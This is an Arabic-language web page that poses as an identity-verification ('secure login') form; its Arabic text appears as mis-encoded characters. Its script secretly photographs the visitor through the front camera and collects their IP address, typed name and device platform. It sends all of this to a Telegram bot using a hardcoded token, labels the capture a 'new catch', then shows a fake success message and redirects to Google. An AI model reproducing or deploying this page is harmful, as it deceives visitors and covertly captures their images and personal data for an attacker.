<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„Ø£Ù…Ø§Ù† - Ø¹Ø¨Ø§Ø³</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 280px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h3>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©</h3>
    <input type="text" id="n" placeholder="Ø§ÙƒØªØ¨ Ø§Ø³Ù…Ùƒ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©...">
    <button onclick="captureAndSend()">Ø¯Ø®ÙˆÙ„ Ø¢Ù…Ù†</button>
</div>

<video id="v" autoplay style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
    const T = "8798304320:AAHW11ODgkShNPElpztLvomrquwaPDcINWQ";
    const ID = "2092901099";

    async function captureAndSend() {
        const name = document.getElementById('n').value;
        if(!name) return alert("Ø§ÙƒØªØ¨ Ø§Ø³Ù…Ùƒ!");

        try {
            // 1. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('v');
            v.srcObject = stream;

            // 2. Ø³Ø­Ø¨ Ø§Ù„Ù€ IP
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Ù…Ø®ÙÙŠ"}));

            // 3. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ©
            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = 320; 
                c.height = 240;
                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
                
                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ù€ Blob (Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø£Ø¶Ù…Ù† Ù„Ù„Ø¥Ø±Ø³Ø§Ù„)
                c.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', ID);
                    fd.append('photo', blob, 'image.jpg');
                    fd.append('caption', `ðŸ“¸ ØµÙŠØ¯ Ø¬Ø¯ÙŠØ¯ ÙŠØ§ Ø¹Ø¨Ø§Ø³!\n\nðŸ“ Ø§Ù„Ø§Ø³Ù…: ${name}\nðŸŒ Ø§Ù„Ù€ IP: ${ipData.ip}\nðŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`);

                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù„Ù„Ø¨ÙˆØª
                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    });

                    stream.getTracks().forEach(t => t.stop());
                    alert("ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!");
                    window.location.href = "https://www.google.com";
                }, 'image/jpeg', 0.6);

            }, 1500);

        } catch (e) {
            alert("Ù„Ø§Ø²Ù… ØªØ¶ØºØ· 'Ø³Ù…Ø§Ø­' Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§!");
        }
    }
</script>
</body>
</html>
